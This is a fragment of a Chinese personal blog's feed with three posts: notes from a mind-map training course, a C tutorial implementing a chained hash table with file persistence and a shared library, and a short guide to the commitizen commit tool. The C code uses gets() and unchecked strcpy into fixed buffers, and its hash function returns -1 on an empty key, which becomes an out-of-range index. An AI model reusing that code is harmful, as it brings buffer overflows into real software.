      <url>2019/06/11/mind-map/</url>
      
        <content type="html"><![CDATA[<p>上周在公司进行了一天的思维导图培训，感觉收获颇丰，有必要总结一下。</p><h2 id="思维导图概述"><a href="#思维导图概述" class="headerlink" title="思维导图概述"></a>思维导图概述</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>思维导图主要用于解决以下三个问题：</p><ol><li>记不住</li><li>理不清</li><li>想不出</li></ol><p>这三个也是工作效能低下的主要原因。那究竟什么是思维导图呢？</p><blockquote><p><strong>思维导图</strong>是表达<strong>放射性思维</strong>的图形思维工具。用<strong>图文</strong>技巧，把各级主题关系用层级图表现，将关键词与图像、颜色等建立思维链接。用<strong>全脑机能</strong>，使在科学与艺术、逻辑与想象间平衡，开启大脑潜能。</p></blockquote><span id="more"></span><p><strong>思维导图</strong>包含以下6大要素，其中，中心主题直接决定思维导图的内容。所谓<strong>左逻右艺</strong>，左脑负责逻辑思维，右脑负责艺术想象。下面的1、2、6由左脑负责，3、4、5由右脑负责，<strong>关系</strong>的本质是<strong>内在逻辑</strong>。</p><p><img src="/assets/mindmap/element.png" alt="six element"></p><p>那我们如何判断一个图是否是思维导图呢？可以根据以下两点：</p><ol><li>图形是否发散</li><li>是否具备必不可少的三个要素（上图中的1、2、3）</li></ol><h3 id="由来"><a href="#由来" class="headerlink" title="由来"></a>由来</h3><p>接下来简单了解下思维导图的由来。思维导图由英国托尼-博赞<strong>Tony Buzan</strong>先生发明，他是受名人笔记（包括达尔文、达芬奇和爱因斯坦的笔记，他们的笔记都是图文形式而且呈发散状）和神经元细胞外形的启发。这些图形的特点是：</p><blockquote><p>一中心多枝条，枝条绕中心画，主干粗分支细，条条连不分家</p></blockquote><p><img src="/assets/mindmap/neure.jpg" alt="neure cell"></p><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>思维导图可应用于生活、工作和学习的方方面面，下图是根据培训资料绘制的一个demo。</p><p><img src="/assets/mindmap/application.png" alt="application"></p><p>总的来说，包含<strong>记理析创</strong>四个作用：</p><ul><li><strong>记</strong> - 帮助记忆</li><li><strong>理</strong> - 帮助理清思路</li><li><strong>析</strong> - 帮助分析问题</li><li><strong>创</strong> - 帮助创新，开拓思维</li></ul><p>高效记忆的方法是<strong>联想</strong>和<strong>联系</strong>，培训课上老师给我们做了个游戏，每个组给出随意两个两位数，7个组共28个数字。老师通过对每个两位数进行编码，通过谐音词去替换，比如36对应三鹿奶粉，87对应白旗，63对应硫酸等等，然后将这些词编成一个故事，越离谱越好，结果真的记住了，而且没有特别复习，倒背如流。这也确实说明大脑对图像，或者画面的记忆更深刻。而思维导图之所以功能强大，就是因为它能达到一种<strong>图导思维</strong>的效果，通过大脑容易记忆的图形引导和开拓思维。</p><h2 id="思维导图的读与绘"><a href="#思维导图的读与绘" class="headerlink" title="思维导图的读与绘"></a>思维导图的读与绘</h2><p>了解了什么是思维导图，以及导图的应用，下面便来说明导图的阅读与绘制。在此之前，先明确一点，思维导图根据图文样式分为<strong>全图</strong>、<strong>全文</strong>和<strong>图文</strong>三类，其中全图的可读性最差，图文的可读性最强。</p><h3 id="读懂导图"><a href="#读懂导图" class="headerlink" title="读懂导图"></a>读懂导图</h3><p>读懂思维导图，分以下4个步骤：</p><p><img src="/assets/mindmap/read.png" alt="read"></p><p>从<strong>1点钟</strong>方向开始读主干，按<strong>顺时针</strong>方向阅读。</p><h3 id="绘制导图"><a href="#绘制导图" class="headerlink" title="绘制导图"></a>绘制导图</h3><p>绘制思维导图同样分为四步，先确定中心主题，然后逐一绘制主干部分，进而绘制支干，最后加上插图并着色修饰。</p><p><img src="/assets/mindmap/write.png" alt="write"></p><p>此外，绘制导图需要遵循以下10个规则和技巧：</p><ol><li>大脑偏好图形</li><li>大脑偏好彩色</li><li>同支同色（同一分支同一颜色）</li><li>大脑喜欢弯的，即引导线要是曲线</li><li>引导线由粗到细</li><li>由点发散</li><li>字在线上</li><li>字线等长（字在线中间）</li><li>用词而不同句子或短语</li><li>纸要横放（A4纸）</li></ol><p>这些规则可以指导我们绘制思维导图，但具体情况具体分析，比如很多思维导图软件绘制的引导线不一定是弯的。</p><h2 id="思维导图的职场应用"><a href="#思维导图的职场应用" class="headerlink" title="思维导图的职场应用"></a>思维导图的职场应用</h2><h3 id="记笔记"><a href="#记笔记" class="headerlink" title="记笔记"></a>记笔记</h3><p>在工作会议中，需要做笔记，此时如果使用传统笔记，会有以下弊病：</p><p><img src="/assets/mindmap/note_bad.png" alt="bad note"></p><p>相比之下，使用思维导图具有更多的优势：</p><p><img src="/assets/mindmap/note_mind.png" alt="mind note"></p><p>使用思维导图做笔记，讲究<strong>抓、画、修</strong>，和女生化妆有点类似。<strong>抓</strong>关键词，<strong>画</strong>思维导图，<strong>修</strong>导图细节。其中<strong>抓</strong>是最关键的一步，<strong>关键词</strong>是精简的核心信息，可唤醒记忆，能扩展思维。</p><p>对于<strong>关键词</strong>，我们可以从文章或会议的四个方面着手，分别是<strong>标题</strong>、<strong>中心句</strong>、<strong>高频词</strong>和<strong>转折后</strong>，而且关键词多半为名词、动词和形容词。抓取过程需掌握<strong>辨虚实</strong>、<strong>明大小</strong>、<strong>分主次</strong>，以便理清思路，明确关键词。</p><p>对于会议笔记，其第一主干应该是基本情况，包括时间、地点和人物；如果是多个人讲话，则应该一个人对应一个主干。同时要清楚的是，<strong>记笔记</strong>和<strong>做笔记</strong>是不一样的，区别如下：</p><ol><li>记是要复述、还原</li><li>做是要加工、提炼分析</li><li>从内容角度而言，记笔记有标准答案</li><li>工作中首选<strong>记笔记</strong></li></ol><h3 id="做计划"><a href="#做计划" class="headerlink" title="做计划"></a>做计划</h3><p>制定计划，设定目标可以参考管理学的<a href="https://baike.baidu.com/item/smart/2230883">SMART</a>原则，具体的可以参考百度百科SMART词条，这里不予详述。</p><ul><li><strong>S</strong>pecific 具体的</li><li><strong>M</strong>easureable 可度量的</li><li><strong>A</strong>chievable 可实现的</li><li><strong>R</strong>elevant 相关性</li><li><strong>T</strong>ime-Based 有时限的</li></ul><p>制定计划分三部分，<strong>方案预案</strong>、<strong>核心要素</strong>和<strong>细节工作</strong></p><p><img src="/assets/mindmap/plan.png" alt="plan"></p><p>其中<strong>5W2H</strong>可以帮助我们理清思路，做好计划，那么制定一个完整计划，就可以大致按照下面的思维导图进行。</p><p><img src="/assets/mindmap/plan_full.png" alt="full plan"></p><h3 id="做总结"><a href="#做总结" class="headerlink" title="做总结"></a>做总结</h3><p>做工作总结包含以下6个目的：</p><p><img src="/assets/mindmap/summary.png" alt="summary"></p><ul><li>看进展 当前已完成及未完成的情况</li><li>寻经验 对高效工作、解决问题等有帮助的经验，表功</li><li>找问题 工作中遇到的问题</li><li>析原因 分析所找问题产生的原因</li><li>定方向 根据进展和问题制定后续工作方向</li><li>提建议 为了完成制定的目标，需要向领导索要的资源</li></ul><p>根据工作总结的目的，我们可以通过思维导图做出工作总结</p><p><img src="/assets/mindmap/summary_2.png" alt="summary 2"></p><p>上面这几个应用是职场经常能用到的，也是比较实用的技巧，培训过程中针对各个应用我们也都有实践操作，但是导图制作比较粗糙，就不放这了。</p><h2 id="思维拓展训练"><a href="#思维拓展训练" class="headerlink" title="思维拓展训练"></a>思维拓展训练</h2><p>以上一大堆的东西都是为了解决开头讲到的<strong>记不住</strong>的问题，下面来看看<strong>理不清</strong>和<strong>想不出</strong>这两个问题的解决方法。</p><h3 id="分类训练"><a href="#分类训练" class="headerlink" title="分类训练"></a>分类训练</h3><p><strong>理不清</strong>的问题，就是搞不清楚各个关键词之间的逻辑关系，不能很好的分清主次。那么分类训练就尤为必要了，把一堆看似杂乱的事物放到一起，对其进行分类，可以让我们理清思路。</p><p>而分类的关键是<strong>不重不漏</strong>，也就是不重复不遗漏，即**<a href="https://baike.baidu.com/item/MECE/7762637">MECE</a>**（Mutually Exclusive, Collectively Exhaustive）,相互独立，完全穷尽。举个例子，将以下食物按照某种方式进行分类：</p><ul><li>葡萄、桔子、苹果、土豆、皮蛋、胡萝卜、鸡蛋、牛奶、酸奶</li></ul><p>有很多分类方式，按水果和非水果分：</p><ul><li>水果：葡萄、桔子、苹果</li><li>非水果：土豆、皮蛋、胡萝卜、鸡蛋、牛奶、酸奶</li></ul><p>按蛋奶类和非蛋奶类：</p><ul><li>蛋奶：皮蛋、鸡蛋、牛奶、酸奶</li><li>非蛋奶：葡萄、桔子、苹果、土豆、胡萝卜</li></ul><p>有人就说了，按蛋白质高低分类，那多少算是高蛋白、多少又算是低蛋白呢，如果没有量化就不好区分了。归根结底，分类的关键是<strong>不重不漏</strong>。</p><h3 id="联想训练"><a href="#联想训练" class="headerlink" title="联想训练"></a>联想训练</h3><p>解决了<strong>理不清</strong>的问题，接下来就剩<strong>想不出</strong>了，脑子卡壳想不出东西，老师总结的一句话</p><blockquote><p><strong>先开花后接龙</strong></p><p><strong>开花</strong>：想法都从主题开始联想，从一到多，即发散思维，可扩展思维的<strong>广度</strong>和<strong>宽度</strong></p><p><strong>接龙</strong>：每一个想法都是从前一个想法联想出来的，类似成语接龙，可扩展思维的<strong>深度</strong>和<strong>精度</strong></p></blockquote><p>为了开花接龙，老师讲了三个重要技巧：</p><ol><li>从正反面、内外部、相近方向联想</li><li>从五感（视听触嗅味）着实联想</li><li>5W2H联想</li></ol><p>之后老师通过一个例子帮助加深印象，针对<strong>党员活动</strong>这个主题，发散思维想点子。首先从关联性，包括相反的、相近的、相关的、内部的、外部的、相通的等方面联想：</p><p><img src="/assets/mindmap/related.jpg" alt="related"></p><p>从五感联想：</p><p><img src="/assets/mindmap/feeling.png" alt="feeling"></p><p>从5W2H联想：</p><p><img src="/assets/mindmap/5w2h.png" alt="5w2h"></p><p>之后老师让我们依据这种方法对<strong>降本增效</strong>这个主题进行头脑风暴，发散思维，可惜当时没拍照。。。联想训练就是先从广度发散、再从深度递进的过程，这可以帮助我们快速想出好的点子。</p><h2 id="思维导图软件"><a href="#思维导图软件" class="headerlink" title="思维导图软件"></a>思维导图软件</h2><p>最后老师给我们推荐了几款常见的思维导图软件，然而这些个我之前都已经了解了，也用过一些，下面的<code>MindManager</code>和<code>iMindMap</code>是收费的，<code>MindManger</code>更适合工作中用，<code>iMindMap</code>是完全按照托尼博赞先生的规则研发的。然而我一般使用<code>ubuntu</code>作为常用操作系统，所以更喜欢百度脑图这款在线思维导图软件。</p><ul><li>Xmind（小妹）</li><li>MindManager（美眉）</li><li>iMindMap（爱美眉）</li><li><a href="http://naotu.baidu.com/">百度脑图</a></li></ul><p>那几个后缀是培训老师教的。。。好记！本文的几个思维导图是通过百度脑图绘制的。然而老师建议在使用软件之前，最少手绘<strong>21</strong>个思维导图，不要问为什么是这个数，我也不知道，我也没敢问。就像机械手表的广告中都是10点10分一样，没有为什么，就是好看。。。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在培训之前，我已经用过一段时间的思维导图了，主要用于梳理代码逻辑和制定项目计划。本次培训加深了对思维导图的理解，规范了导图的绘制和读图技巧，修正了几个之前绘图时没太注意的问题，同时也知晓了导图用途之广、功能之强！的确值得学习和应用。</p><p>此外，也扩展几个知识点，如基于MECE原则的分类方法、基于SMART的目标制定、左逻右艺的大脑分工、先开花后接龙的思维发散技巧等。在以后的生活、学习和工作中，相信通过思维导图可以提高各方面的办事效率，节约时间。最后，希望看到这份总结的有缘人也能有所收获。</p><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><p>下面是我写这篇文章之前绘制的大纲，也是一张思维导图，帮我理清写作方向和思路。</p><p><img src="/assets/mindmap/summary.jpeg" alt="summary"></p><h3 id="老师推荐书籍"><a href="#老师推荐书籍" class="headerlink" title="老师推荐书籍"></a>老师推荐书籍</h3><ul><li>《结构性思维》</li><li>《金字塔原理》</li></ul>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5W2H </tag>
            
            <tag> MECE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哈希表的实现与常见操作</title>
      <link href="2019/05/24/hash-table/"/>
      <url>2019/05/24/hash-table/</url>
      
        <content type="html"><![CDATA[<p>前段时间基于数组和单链表以拉链法写了个哈希表，实现了基本的增删改查（<code>CRUD</code>），以键值对的形式存储一些配置参数，便以此文记录一下。</p><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><pre><code class="c">#define TABLE_SIZE 101#define KEY_SIZE 32#define VALUE_SIZE 128#define BUF_SIZE 256#define DATA_PATH &quot;data.txt&quot;struct linklist &#123;    char key[KEY_SIZE];    char val[VALUE_SIZE];    struct linklist *next;&#125;;struct linklist *hashtbl[TABLE_SIZE];</code></pre><span id="more"></span><p>简单起见，使用两个字符数组分别用于存储键<code>key</code>和值<code>value</code>,每个键值对都以单链表<code>linklist</code>的一个节点形式存储。哈希表<code>hashtbl</code>数组存储每个单链表的头部指针<code>head</code>。</p><p><img src="/assets/hash/hash_table.jpg" alt="hash table"></p><h2 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h2><p>对于字符串的哈希函数，我选择了《算法》第4版提供的一种叫 Horner 的经典算法，用 N 次乘法、加法和取余来计算一个字符串的散列值。注意书中的算法实现均采用<code>java</code>语言↓</p><pre><code class="java">hash = (R * hash + s.charAt(i)) % M;</code></pre><p>其中，R是一个素数，只要其足够小，就能保证hash在（0～M-1）之内。这里设R为31，M即哈希表的长度，下面就是根据以上算法实现的一个字符串哈希函数。</p><pre><code class="c">/* calc hash code of string */uint32_t hash(char *key) &#123;    int len = strlen(key);    int i;    uint32_t ret = 0;    if(!len)        return -1;    for(i=0; i &lt; len; i++) &#123;        ret = (ret * 31 + (uint32_t)key[i]) % TABLE_SIZE;    &#125;    return ret;&#125;</code></pre><p>字符串的哈希函数还有很多，具体可以参考<a href="https://www.cnblogs.com/uvsjoh/archive/2012/03/27/2420120.html">字符串哈希函数</a></p><h2 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h2><p>上面定义好了哈希表的存储方式，以及字符串的哈希函数，下面便可以逐个实现对哈希表的增删改查。</p><h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p>首先实现哈希表元素的增添或更改:</p><ol><li>计算待插入或更新键的哈希值</li><li>遍历哈希值所在链表，判断当前键是否已存在</li><li>若键不存在，则在表头插入新键；若已存在，则更新键值</li></ol><p>插入新键时使用<code>malloc</code>分配内存，同时更新所在链表的表头</p><p><img src="/assets/hash/set_new_key.jpg" alt="set new key"></p><pre><code class="c">/* set or update value of key to hash table */int set(char *key, char *val) &#123;    uint32_t i;    struct linklist *l, *n;    if(!key || !val)        return -1;    i = hash(key);    for(l = hashtbl[i]; l &amp;&amp; strcmp(key, l-&gt;key); l = l-&gt;next);    if(l)        strcpy(l-&gt;val, val);    else &#123;        n = malloc(sizeof(struct linklist));        if(!n)            return -1;        strcpy(n-&gt;key, key);        strcpy(n-&gt;val, val);        /* insert new key to the head of linklist */        n-&gt;next = hashtbl[i];        hashtbl[i] = n;    &#125;    return 0;&#125;</code></pre><h3 id="unset"><a href="#unset" class="headerlink" title="unset"></a>unset</h3><p>对键的删除其实就是对一块内存的释放，先计算哈希值，遍历链表找到待删除的键，最后<code>free</code>即可。</p><p><img src="/assets/hash/unset_key.jpg" alt="unset key"></p><p>这里需要考虑的一个问题是如果待删除键值对<code>l</code>是表头后第一个节点，需要将链表表头指针直接指向<code>l-&gt;next</code>。</p><pre><code class="c">/* remove key from hash table */int unset(char *key) &#123;    uint32_t i;    struct linklist *l, *prev;    if(!key)        return -1;    i = hash(key);    for(prev = hashtbl[i], l = prev; l &amp;&amp; strcmp(key, l-&gt;key); prev = l, l = l-&gt;next);    if(l) &#123;        if (l == prev)            hashtbl[i] = l-&gt;next;        else            prev-&gt;next = l-&gt;next;        free(l);    &#125;    return 0;&#125;</code></pre><h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><p>获取键值就非常简单了，计算哈希值后直接遍历链表即可。</p><pre><code class="c">/* get value of key from hash table */char* get(char *key) &#123;    uint32_t i;    struct linklist * l;    if(!key)        return NULL;    i = hash(key);    for(l = hashtbl[i]; l &amp;&amp; strcmp(key, l-&gt;key); l = l-&gt;next);    return l ? l-&gt;val : NULL;&#125;</code></pre><h2 id="其它操作"><a href="#其它操作" class="headerlink" title="其它操作"></a>其它操作</h2><h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><p><code>show</code>函数用于显示哈希表当前存储的所有数据，实现方法即循环遍历哈希表，然后打印出每个链表节点存储的键值对。每行打印一组键值对，并且键值对之前会打印出当前键对应的哈希函数计算结果。</p><pre><code class="c">/* show all the keys &amp; values of hash table */void show() &#123;    int i;    struct linklist *l;    __nprintf(&quot;---------------------------------------&quot;);    for(i = 0; i &lt; TABLE_SIZE; i++)        for(l = hashtbl[i]; l != NULL; l = l-&gt;next)            __nprintf(&quot;%d\t%s=\&quot;%s\&quot;&quot;, hash(l-&gt;key), l-&gt;key, l-&gt;val);    __nprintf(&quot;---------------------------------------&quot;);&#125;</code></pre><p>函数中用到的<code>__nprintf</code>函数如下，是通过向终端<code>/dev/tty</code>写入数据完成对数据的终端显示，注意不同操作系统的终端设备路径可能不太一样，例如嵌入式Linux系统可能使用的是<code>dev/console</code>.</p><pre><code class="c">/* use this &#39;__nprintf&#39; to print message */void __nprintf(const char *fmt, ...) &#123;    va_list ap;    static FILE *filp;    if ((filp == NULL) &amp;&amp; (filp = fopen(&quot;/dev/tty&quot;, &quot;a&quot;)) == NULL)        return;    va_start(ap, fmt);    vfprintf(filp, fmt, ap);    fputs(&quot;\n&quot;, filp);    va_end(ap);&#125;</code></pre><h3 id="commit"><a href="#commit" class="headerlink" title="commit"></a>commit</h3><p>除了将数据显示在终端外，还可以通过下面的<code>commit</code>函数将数据存入文件当中，该文件就可以充当最简易的数据库。</p><pre><code class="c">/* save all keys &amp; values from memory to local file */int commit() &#123;    int i;    struct linklist *l;    char buf[BUF_SIZE];    FILE *fp;    fp = fopen(DATA_PATH, &quot;w&quot;);    if(!fp)        return -1;    for(i = 0; i &lt; TABLE_SIZE; i++) &#123;        for(l = hashtbl[i]; l != NULL; l = l-&gt;next) &#123;            snprintf(buf, BUF_SIZE, &quot;%s=\&quot;%s\&quot;\n&quot;, l-&gt;key, l-&gt;val);            fputs(buf, fp);        &#125;    &#125;    fclose(fp);    return 0;&#125;</code></pre><h3 id="load"><a href="#load" class="headerlink" title="load"></a>load</h3><p>既然上面提到了数据存储，那自然就少不了数据读取，将存入文件的数据加载到内存当中，作为进程启动的首个任务，这便是<code>load</code>函数所完成的工作。</p><pre><code class="c">/* load keys &amp; values from local file to memory */int load() &#123;    int i;    struct linklist *l;    char buf[BUF_SIZE]=&#123;0&#125;;    char *key, *val;    FILE *fp;    fp = fopen(DATA_PATH, &quot;r&quot;);    if(!fp)        return -1;    while(fgets(buf, BUF_SIZE, fp)) &#123;        key = strtok(buf, &quot;=&quot;);        val = strtok(NULL, &quot;\&quot;\n&quot;);        set(key, val);    &#125;    fclose(fp);    return 0;&#125;</code></pre><p>至此，与哈希表的基本操作函数都已实现，下面将使用这些基本函数实现对哈希表的一些常见操作↓</p><h2 id="应用实例"><a href="#应用实例" class="headerlink" title="应用实例"></a>应用实例</h2><h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><p>下面实现一个<code>hash</code>程序，对哈希表进行交互式操作，程序主要内容如下：</p><ol><li>启动时加载存储文件中的数据到哈希表</li><li>从终端不断获取用户指令，完成数据的增删改查与存储，以及程序的帮助信息及退出</li></ol><pre><code class="c">#include &quot;hash.h&quot;static void help() &#123;    __nprintf(&quot;  help \t\t--show this infomation\n&quot; \          &quot;  set key val \t--set or update value of key\n&quot; \          &quot;  unset key \t--remove key from hash table\n&quot; \          &quot;  get key \t--show value of key\n&quot; \          &quot;  show \t\t--show all keys &amp; values of hash table\n&quot; \          &quot;  commit \t--write all keys &amp; values to local file\n&quot; \          &quot;  exit \t\t--exit current session&quot;          );&#125;int main(int argc, char *argv[]) &#123;    char cmd[128]=&#123;0&#125;;    char *action, *key, *val;    load();    while(1) &#123;        printf(&quot;CMD&gt; &quot;);        gets(cmd);        key = NULL;        val = NULL;        action = strtok(cmd, &quot; &quot;);        if(!action)            continue;        if(!strcmp(action, &quot;set&quot;)) &#123;            key = strtok(NULL, &quot; &quot;);            val = strtok(NULL, &quot;\n&quot;);            set(key, val);        &#125;               else if (!strcmp(action, &quot;unset&quot;)) &#123;            key = strtok(NULL, &quot; &quot;);            unset(key);        &#125;        else if (!strcmp(action, &quot;get&quot;)) &#123;            key = strtok(NULL, &quot; &quot;);            val = get(key);            if(val)                __nprintf(&quot;%s=\&quot;%s\&quot;&quot;, key, val);        &#125;        else if (!strcmp(action, &quot;show&quot;))            show();        else if (!strcmp(action, &quot;commit&quot;))            commit();        else if (!strcmp(action, &quot;help&quot;))            help();        else if (!strcmp(action, &quot;exit&quot;)) &#123;            commit();            break;        &#125;        else &#123;            __nprintf(&quot;unknown cmd, try help!&quot;);            continue;        &#125;    &#125;&#125;</code></pre><p>编译后应用示例如下：</p><pre><code class="bash">➜  hash git:(master) ./hashCMD&gt; help  help          --show this infomation  set key val   --set or update value of key  unset key     --remove key from hash table  get key       --show value of key  show          --show all keys &amp; values of hash table  commit        --write all keys &amp; values to local file  exit          --exit current sessionCMD&gt; set id 1234CMD&gt; show---------------------------------------22      id=&quot;1234&quot;---------------------------------------CMD&gt; get idid=&quot;1234&quot;CMD&gt;CMD&gt; set username litreilyCMD&gt; set password 123456CMD&gt; show---------------------------------------22      id=&quot;1234&quot;79      password=&quot;123456&quot;88      username=&quot;litreily&quot;---------------------------------------CMD&gt; unset passwordCMD&gt; show---------------------------------------22      id=&quot;1234&quot;88      username=&quot;litreily&quot;---------------------------------------CMD&gt; commitCMD&gt; exit➜  hash git:(master)</code></pre><h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><p>除了交互式程序<code>hash</code>外，我还写了一个测试用例，用于生成100组随机键值对，键值对由随机长度及字符组成，最终得到的哈希表将存入本地文件<code>data.txt</code>中。</p><pre><code class="c">#include &lt;time.h&gt;#include &quot;hash.h&quot;#define MAX_KEYS 1024static const char * key_pool = &quot;abcdefghijklmnopqrstuvwxyz_&quot;;static const char * val_pool = &quot;abcdefghijklmnopqrstuvwxyz_0123456789 .&quot;;void set_rand_key() &#123;    int key_maxlen = strlen(key_pool);    int val_maxlen = strlen(val_pool);    char key[32] = &#123;0&#125;;    char val[128] = &#123;0&#125;;    int key_len, val_len, i;    key_len = 1 + rand() % 16;    val_len = 4 + rand() % 50;    for(i = 0; i &lt; key_len; i++)        key[i] = key_pool[rand() % key_maxlen];    for(i = 0; i &lt; val_len; i++)        val[i] = val_pool[rand() % val_maxlen];    set(key, val);&#125;int main(int argc, char *argv[]) &#123;    int i;    int test_times = argc &gt; 1? atoi(argv[1]) : MAX_KEYS;    srand((uint32_t)time(NULL));    for(i = 0; i &lt; test_times; i++)        set_rand_key();    commit();    show();    return 0;&#125;</code></pre><p>该测试用例也可以大致用来测试哈希函数的可靠性，只要看数据中每个键值对前面的哈希值是否均匀分布即可，实践证明是均匀分布的，这里不再给出测试过程。</p><h3 id="libhash-so"><a href="#libhash-so" class="headerlink" title="libhash.so"></a>libhash.so</h3><p>在复习哈希函数的同时，顺便复习了下动态链接库的生成和使用，要把<code>hash.c</code>编译成链接库<code>libhash.so</code>，可以使用以下编译语句</p><pre><code class="bash">gcc -fPIC -c hash.cgcc -shared -o libhash.so hash.o</code></pre><p>其中的<code>shared</code>用于指定生成动态链接库。</p><p>在使用动态链接库时，需要让使用库文件的程序访问该库，有以下方法：</p><ol><li>将动态链接库拷贝到系统环境变量包含的路径中，如<code>/usr/lib</code></li><li>将动态链接库所在路径添加到环境变量</li><li>修改变量<code>LD_LIBRARY_PATH</code>,将动态链接库的路径添加其中</li></ol><p>下面举一个很简单的例子,<code>demo.c</code></p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;extern void __nprintf(const char *fmt, ...);extern uint32_t hash(char *key);extern char* get(char *key);extern int set(char *key, char *val);extern int unset(char *key);extern int commit();extern int load();extern void show();int main(int argc, char *argv[]) &#123;    __nprintf(&quot;start&quot;);    load();    show();    __nprintf(&quot;end&quot;);    return 0;&#125;</code></pre><p>代码很简单，就是完成哈希表的导入与显示，编译语句如下：</p><pre><code class="bash">gcc -fPIC demo.c -o demo -L. -lhash</code></pre><p>其中，<code>-L.</code>代表从当前目录寻找链接库，<code>-lhash</code>代表链接到库<code>libhash.so</code>,注意前缀<code>lib</code>及后缀<code>.so</code>是自动添加的，编译语句中无需添加。</p><h3 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h3><p>如果将以上所有程序一起编译，就需要编写<code>Makefile</code>如下</p><pre><code class="Makefile">.PHONY: all cleanall: hash test libhash.so demoCC=gccCFLAGS=-fPIC%.o: %.c    $(CC) $(CFLAGS) -c $&lt;hash: main.o hash.o    $(CC) -o $@ $^test: test.o hash.o    $(CC) -o $@ $^libhash.so: hash.o    $(CC) -shared -o $@ $^demo: demo.o    $(CC) $^ -o $@ -L. -lhashclean:    rm -rf *.o hash test libhash.so demo</code></pre><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文主要讲述了哈希表的简单实现方法及其常见操作，然后通过几个简单例子说明了使用方法，最后顺道说了一下动态链接库的生成及使用方法。</p>]]></content>
      
      
      <categories>
          
          <category> Embedded </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> linux </tag>
            
            <tag> hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git commit 工具 - commitizen</title>
      <link href="2019/03/12/commitizen/"/>
      <url>2019/03/12/commitizen/</url>
      
        <content type="html"><![CDATA[<p>为了规范代码提交，最近学习了一下如何使用<code>commitizen</code>进行commit提交，其实也很简单，这里简单做个介绍。</p><h2 id="commitizen-安装"><a href="#commitizen-安装" class="headerlink" title="commitizen 安装"></a>commitizen 安装</h2><pre><code class="bash">npm install -g commitizen</code></pre><span id="more"></span><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>对于并非使用<code>nodejs</code>的项目，要先通过</p><pre><code class="sh">npm init --yes</code></pre><p>完成初始化，然后通过</p><pre><code class="sh">commitizen init cz-conventional-changelog --save --save-exact</code></pre><p>启用<code>commitizen</code>功能，此后使用<code>git cz</code>替换<code>git commit</code>即可。当然为了方便可以在<code>.bashrc</code>或<code>.zshrc</code>中添加一个别名。</p><pre><code class="sh">alias cz=&quot;commitizen init cz-conventional-changelog --save --save-exact&quot;</code></pre><p>然后<code>source ~/.bashrc</code> or <code>source ~/.zshrc</code> 即可。好了，下面是我的笔记库的应用实例。</p><pre><code class="bash">➜  Notes git:(master) ✗ npm init --yes➜  Notes git:(master) ✗ commitizen init cz-conventional-changelog --save --save-exact➜  Notes git:(master) ✗ git czcz-cli@3.0.7, cz-conventional-changelog@2.1.0Line 1 will be cropped at 100 characters. All other lines will be wrapped after 100 characters.? Select the type of change that you&#39;re committing:  chore:    Other changes that don&#39;t modify src or test files  revert:   Reverts a previous commit  feat:     A new feature❯ fix:      A bug fix  docs:     Documentation only changes  style:    Changes that do not affect the meaning of the code (white-space, formatting, missing semi-colons, etc)  refactor: A code change that neither fixes a bug nor adds a feature(Move up and down to reveal more choices)</code></pre><p>目前该工具支持以下几种提交类型：</p><table><thead><tr><th align="center"><code>type</code></th><th align="left"><code>description</code></th></tr></thead><tbody><tr><td align="center">feat</td><td align="left">A new feature</td></tr><tr><td align="center">fix</td><td align="left">A bug fix</td></tr><tr><td align="center">docs</td><td align="left">Documentation only changes</td></tr><tr><td align="center">style</td><td align="left">Changes that do not affect the meaning of the code</td></tr><tr><td align="center">refactor</td><td align="left">A code change that neither fixes a bug nor adds a feature</td></tr><tr><td align="center">perf</td><td align="left">A code change that improves performance</td></tr><tr><td align="center">test</td><td align="left">Adding missing tests or correcting existing tests</td></tr><tr><td align="center">build</td><td align="left">Changes that affect the build system or external dependencies</td></tr><tr><td align="center">ci</td><td align="left">Changes to our CI configuration files and scripts</td></tr><tr><td align="center">chore</td><td align="left">Other changes that don&#39;t modify src or test files</td></tr><tr><td align="center">revert</td><td align="left">Reverts a previous commit</td></tr></tbody></table><p>下面是添加commit的过程</p><pre><code class="bash">➜  Notes git:(master) ✗ git czcz-cli@3.0.7, cz-conventional-changelog@2.1.0Line 1 will be cropped at 100 characters. All other lines will be wrapped after 100 characters.? Select the type of change that you&#39;re committing: docs:     Documentation only changes? What is the scope of this change (e.g. component or file name)? (press enter to skip)? Write a short, imperative tense description of the change: update docs about git stash? Provide a longer description of the change: (press enter to skip)? Are there any breaking changes? No? Does this change affect any open issues? No[master d82e0e9] docs: update docs about git stash 2 files changed, 19 insertions(+)➜  Notes git:(master)</code></pre><p>提交过程会逐步提示你添加相应的内容，不添加的直接回车跳过即可。大部分情况只要选择<code>type</code>以及描述信息。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="http://www.ruanyifeng.com/blog/2016/01/commit_message_change_log.html">Commit message 和 Change log 编写指南</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python网络爬虫5 - 爬取QQ空间相册</title>
      <link href="2019/03/03/qqzone/"/>
      <url>2019/03/03/qqzone/</url>
      
